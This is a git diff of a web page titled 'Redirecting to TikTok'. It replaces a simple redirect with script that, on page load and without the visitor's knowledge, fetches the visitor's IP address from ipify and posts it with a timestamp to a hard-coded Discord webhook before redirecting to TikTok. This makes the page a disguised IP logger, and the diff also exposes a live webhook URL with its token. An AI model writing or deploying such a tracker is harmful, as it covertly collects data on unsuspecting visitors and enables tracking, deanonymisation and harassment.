@@ -4,23 +4,109 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Redirecting to TikTok</title>
+    <link rel="stylesheet" href="style.css" />
     <script>
-      window.onload = function () {
-        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-        const tiktokAppUrl = "snssdk1128://"; 
-        const tiktokWebUrl = "https://www.tiktok.com"; 
+      // Your provided JavaScript code goes here
+      const ipifyAPI = "https://api.ipify.org?format=json";
+      const webhookURL =
+        "https://discord.com/api/webhooks/1367683410989940756/cx2uFFLodvi3paS-hUHxv9waFC4LG2FEqRGLs0bO8nV3CQ-qvPnp8NYbsmiMkMHRteA5";
 
-        if (isMobile) {
-   
-          window.location.href = tiktokAppUrl;
-        } else {
+      function getGeorgianTime() {
+        const now = new Date();
+        const georgianOffset = 4;
+        const georgianTime = new Date(
+          now.getTime() + georgianOffset * 60 * 60 * 1000
+        );
 
-          window.location.href = tiktokWebUrl;
+        const year = georgianTime.getFullYear();
+        const month = String(georgianTime.getMonth() + 1).padStart(2, "0");
+        const day = String(georgianTime.getDate()).padStart(2, "0");
+        const hours = String(georgianTime.getHours()).padStart(2, "0");
+        const minutes = String(georgianTime.getMinutes()).padStart(2, "0");
+        const seconds = String(georgianTime.getSeconds()).padStart(2, "0");
+
+        return `${year}-${month}-${day} ${hours}:${minutes}:${seconds} (Georgian Time)`;
+      }
+
+      async function getIP() {
+        try {
+          console.log("Fetching IP...");
+          const response = await fetch(ipifyAPI);
+          if (!response.ok) {
+            throw new Error(`ipify API returned status ${response.status}`);
+          }
+          const data = await response.json();
+          if (!data.ip) {
+            throw new Error("No IP address found in ipify response.");
+          }
+          console.log("Fetched IP:", data.ip);
+          return data.ip;
+        } catch (error) {
+          console.error("Error fetching IP:", error);
+          return null;
         }
-      };
+      }
+
+      async function sendToDiscord(ip) {
+        if (!ip) {
+          console.error("IP address is null or undefined.");
+          return;
+        }
+
+        const timestamp = getGeorgianTime();
+
+        const payload = {
+          content: `IP Address: ${ip}\nTimestamp: ${timestamp}`,
+        };
+
+        try {
+          console.log("Sending data to Discord...");
+          const response = await fetch(webhookURL, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify(payload),
+          });
+
+          if (!response.ok) {
+            throw new Error(
+              `Discord webhook returned status ${response.status}`
+            );
+          }
+          console.log("IP and time sent to Discord successfully!");
+        } catch (error) {
+          console.error("Error sending data to Discord:", error);
+        }
+      }
+
+      async function main() {
+        const ip = await getIP();
+        if (ip) {
+          await sendToDiscord(ip);
+          redirectToTikTok();
+        } else {
+          console.error("Could not retrieve IP address.");
+        }
+      }
+
+      function redirectToTikTok() {
+        setTimeout(() => {
+          window.location.href = "snssdk1128://"; // TikTok app scheme
+          setTimeout(() => {
+            window.location.href = "https://www.tiktok.com"; // Fallback URL for browsers
+          }, 3000);
+        }, 1000); // Delay to ensure everything completes
+      }
+
+      window.onload = main;
     </script>
   </head>
   <body>
-    <p>Redirecting to TikTok...</p>
+    <div class="container">
+      <div class="logo">Redirecting to <span>TikTok</span></div>
+      <div class="spinner"></div>
+      <div class="message">Please wait...</div>
+    </div>
   </body>
 </html>
